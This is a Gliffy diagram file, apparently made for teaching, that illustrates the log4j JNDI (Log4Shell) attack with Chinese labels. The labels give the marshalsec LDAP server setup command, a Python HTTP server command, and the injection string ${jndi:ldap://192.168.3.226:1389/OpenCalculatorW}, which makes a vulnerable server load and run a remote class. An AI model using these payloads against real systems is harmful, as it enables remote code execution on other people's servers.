{"contentType":"application/gliffy+json","version":"1.1","metadata":{"title":"untitled","revision":0,"exportBorder":false},"embeddedResources":{"index":0,"resources":[]},"stage":{"objects":[{"x":467.5,"y":130,"rotation":0,"id":46,"uid":"com.gliffy.shape.basic.basic_v1.default.text","width":452,"height":82,"lockAspectRatio":false,"lockShape":false,"order":46,"graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"none","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 36px; font-family: Arial; white-space: pre-wrap; text-decoration: none; font-weight: bold; line-height: 41px; color: rgb(0, 0, 0);\">The log4j JNDI Attcak</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null,"linkMap":[]},{"x":493,"y":828,"rotation":0,"id":37,"uid":"com.gliffy.shape.uml.uml_v1.default.implements","width":100,"height":100,"lockAspectRatio":false,"lockShape":false,"order":37,"graphic":{"type":"Line","Line":{"strokeWidth":1,"strokeColor":"#000000","fillColor":"none","dashStyle":"8.0,2.0","startArrow":0,"endArrow":4,"startArrowRotation":"auto","endArrowRotation":"auto","ortho":true,"interpolationType":"linear","cornerRadius":null,"controlPath":[[499.33333333333326,-330.5],[256.66666666666663,-330.5],[256.66666666666663,-295.5],[14,-295.5]],"lockSegments":{}}},"children":[{"x":0,"y":0,"rotation":0,"id":38,"uid":null,"width":139,"height":28,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">2、调用LDAP服务\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">ldap://192.168.3.226:1389</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"constraints":{"constraints":[],"startConstraint":{"type":"StartPositionConstraint","StartPositionConstraint":{"nodeId":21,"px":0,"py":0.5}},"endConstraint":{"type":"EndPositionConstraint","EndPositionConstraint":{"nodeId":29,"px":1,"py":0.5}}},"linkMap":[]},{"x":430,"y":472.5,"rotation":0,"id":29,"uid":"com.gliffy.shape.network.network_v3.business.proxy_server","width":77,"height":120,"lockAspectRatio":true,"lockShape":false,"order":29,"graphic":{"type":"Shape","Shape":{"tid":"com.gliffy.stencil.proxy_server_3d.network_v3","strokeWidth":2,"strokeColor":"#000000","fillColor":"#003366","gradient":false,"dropShadow":false,"state":0,"shadowX":0,"shadowY":0,"opacity":1}},"children":[{"x":2,"y":0,"rotation":0,"id":34,"uid":null,"width":244,"height":56,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"below","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">载有恶意class的LDAP服务\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">192.168.3.226\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">Listening on 0.0.0.0:1389\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">Serving HTTP on :: port 8000 (http://[::]:8000/)</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"linkMap":[]},{"x":1020,"y":230,"rotation":0,"id":26,"uid":"com.gliffy.shape.network.network_v3.business.web_server","width":102.66666666666663,"height":160,"lockAspectRatio":true,"lockShape":false,"order":26,"graphic":{"type":"Shape","Shape":{"tid":"com.gliffy.stencil.web_server_3d.network_v3","strokeWidth":2,"strokeColor":"#000000","fillColor":"#003366","gradient":false,"dropShadow":false,"state":0,"shadowX":0,"shadowY":0,"opacity":1}},"children":[{"x":2,"y":0,"rotation":0,"id":28,"uid":null,"width":156,"height":14,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"below","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; white-space: pre-wrap; text-decoration: none; line-height: 14px; color: rgb(0, 0, 0);\">被攻击的应用服务所在服务器</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"linkMap":[]},{"x":639,"y":591,"rotation":0,"id":25,"uid":"com.gliffy.shape.uml.uml_v1.default.association","width":100,"height":100,"lockAspectRatio":false,"lockShape":false,"order":25,"graphic":{"type":"Line","Line":{"strokeWidth":1,"strokeColor":"#000000","fillColor":"none","dashStyle":null,"startArrow":0,"endArrow":0,"startArrowRotation":"auto","endArrowRotation":"auto","ortho":true,"interpolationType":"linear","cornerRadius":null,"controlPath":[[432.33333333333326,-130.8858074281676],[432.33333333333326,-154.25720495211175],[432.33333333333326,-177.62860247605585],[432.33333333333326,-201]],"lockSegments":{}}},"children":[{"x":0,"y":0,"rotation":0,"id":41,"uid":null,"width":145,"height":14,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">使用了带有漏洞版本的log4j</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"constraints":{"constraints":[],"startConstraint":{"type":"StartPositionConstraint","StartPositionConstraint":{"nodeId":21,"px":0.5,"py":0}},"endConstraint":{"type":"EndPositionConstraint","EndPositionConstraint":{"nodeId":26,"px":0.5,"py":1}}},"linkMap":[]},{"x":436,"y":260,"rotation":0,"id":15,"uid":"com.gliffy.shape.uml.uml_v1.default.actor","width":63,"height":100,"lockAspectRatio":true,"lockShape":false,"order":15,"graphic":{"type":"Shape","Shape":{"tid":"com.gliffy.stencil.actor.uml_v1","strokeWidth":1,"strokeColor":"#000000","fillColor":"#FFFFFF","gradient":false,"dropShadow":false,"state":0,"shadowX":0,"shadowY":0,"opacity":1}},"children":[{"x":2,"y":0,"rotation":0,"id":17,"uid":null,"width":36,"height":14,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"below","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">攻击者</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"linkMap":[]},{"x":24,"y":723,"rotation":0,"id":39,"uid":"com.gliffy.shape.uml.uml_v1.default.implements","width":100,"height":100,"lockAspectRatio":false,"lockShape":false,"order":39,"graphic":{"type":"Line","Line":{"strokeWidth":1,"strokeColor":"#000000","fillColor":"none","dashStyle":"8.0,2.0","startArrow":0,"endArrow":4,"startArrowRotation":"auto","endArrowRotation":"auto","ortho":true,"interpolationType":"linear","cornerRadius":null,"controlPath":[[444.5,-130.5],[444.5,-90.5],[1012.2673161553512,-90.5],[1012.2673161553512,-188]],"lockSegments":{}}},"children":[{"x":0,"y":0,"rotation":0,"id":40,"uid":null,"width":215,"height":28,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">3、jndi注入恶意class(OpenCalculatorW)\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">并执行</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"constraints":{"constraints":[],"startConstraint":{"type":"StartPositionConstraint","StartPositionConstraint":{"nodeId":29,"px":0.5,"py":1}},"endConstraint":{"type":"EndPositionConstraint","EndPositionConstraint":{"nodeId":21,"px":0.29289321881345254,"py":0.9999999999999998}}},"linkMap":[]},{"x":-31,"y":379,"rotation":0,"id":32,"uid":"com.gliffy.shape.uml.uml_v1.default.message","width":100,"height":100,"lockAspectRatio":false,"lockShape":false,"order":32,"graphic":{"type":"Line","Line":{"strokeWidth":1,"strokeColor":"#000000","fillColor":"none","dashStyle":null,"startArrow":0,"endArrow":2,"startArrowRotation":"auto","endArrowRotation":"auto","ortho":false,"interpolationType":"linear","cornerRadius":null,"controlPath":[[498.5,-19],[499.5,93.5]],"lockSegments":{}}},"children":[{"x":0,"y":0,"rotation":0,"id":33,"uid":null,"width":757,"height":42,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">0、搭建\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">python3 -m http.server 8000\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer exploit.codebase \"http://192.168.3.226:8000/#OpenCalculatorW</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"constraints":{"constraints":[],"startConstraint":{"type":"StartPositionConstraint","StartPositionConstraint":{"nodeId":15,"px":0.5,"py":1}},"endConstraint":{"type":"EndPositionConstraint","EndPositionConstraint":{"nodeId":29,"px":0.5,"py":0}}},"linkMap":[]},{"x":992.3333333333333,"y":460,"rotation":0,"id":21,"uid":"com.gliffy.shape.basic.basic_v1.default.round_rectangle","width":150,"height":75,"lockAspectRatio":false,"lockShape":false,"order":21,"graphic":{"type":"Shape","Shape":{"tid":"com.gliffy.stencil.round_rectangle.basic_v1","strokeWidth":0,"strokeColor":"#333333","fillColor":"#6aa84f","gradient":false,"dropShadow":false,"state":0,"shadowX":0,"shadowY":0,"opacity":1}},"children":[{"x":3,"y":0,"rotation":0,"id":23,"uid":null,"width":144,"height":42,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"none","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; white-space: pre-wrap; text-decoration: none; line-height: 14px; color: rgb(0, 0, 0);\">log4j2，记录用户输入\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; white-space: pre-wrap; text-decoration: none; line-height: 14px; color: rgb(0, 0, 0);\">检测到有特殊字符，进行调用</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"linkMap":[]},{"x":596,"y":471,"rotation":0,"id":13,"uid":"com.gliffy.shape.uml.uml_v1.default.message","width":100,"height":100,"lockAspectRatio":false,"lockShape":false,"order":13,"graphic":{"type":"Line","Line":{"strokeWidth":1,"strokeColor":"#000000","fillColor":"none","dashStyle":null,"startArrow":0,"endArrow":2,"startArrowRotation":"auto","endArrowRotation":"auto","ortho":false,"interpolationType":"linear","cornerRadius":null,"controlPath":[[-97,-161],[424,-161]],"lockSegments":{}}},"children":[{"x":0,"y":0,"rotation":0,"id":14,"uid":null,"width":413,"height":56,"lockAspectRatio":false,"lockShape":false,"order":"auto","graphic":{"type":"Text","Text":{"tid":null,"valign":"middle","overflow":"both","vposition":"none","hposition":"none","html":"<p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">1、向服务器输入特殊字符串，诱导服务器请求载有恶意class的LDAP服务，如\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">${jndi:ldap://192.168.3.226:1389/OpenCalculatorW}\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">${java:os}\n</span></p><p style=\"text-align:center;\"><span style=\"font-size: 12px; font-family: Arial; color: rgb(204, 0, 0); white-space: pre-wrap; text-decoration: none; line-height: 14px;\">${java:version}</span></p>","paddingLeft":2,"paddingRight":2,"paddingBottom":2,"paddingTop":2}},"children":null}],"constraints":{"constraints":[],"startConstraint":{"type":"StartPositionConstraint","StartPositionConstraint":{"nodeId":15,"px":1,"py":0.5}},"endConstraint":{"type":"EndPositionConstraint","EndPositionConstraint":{"nodeId":26,"px":0,"py":0.5}}},"linkMap":[]}],"background":"#FFFFFF","width":1149,"height":651,"maxWidth":5000,"maxHeight":5000,"nodeIndex":48,"autoFit":true,"exportBorder":false,"gridOn":true,"snapToGrid":true,"drawingGuidesOn":true,"pageBreaksOn":false,"printGridOn":false,"printPaper":"LETTER","printShrinkToFit":false,"printPortrait":true,"shapeStyles":{"com.gliffy.shape.basic.basic_v1.default":{"fill":"#6aa84f","stroke":"#333333","strokeWidth":0,"shadow":false,"gradient":false},"com.gliffy.shape.network.network_v3.home":{"fill":"#003366"},"com.gliffy.shape.network.network_v3.business":{"fill":"#003366"}},"lineStyles":{"global":{}},"textStyles":{},"themeData":null}}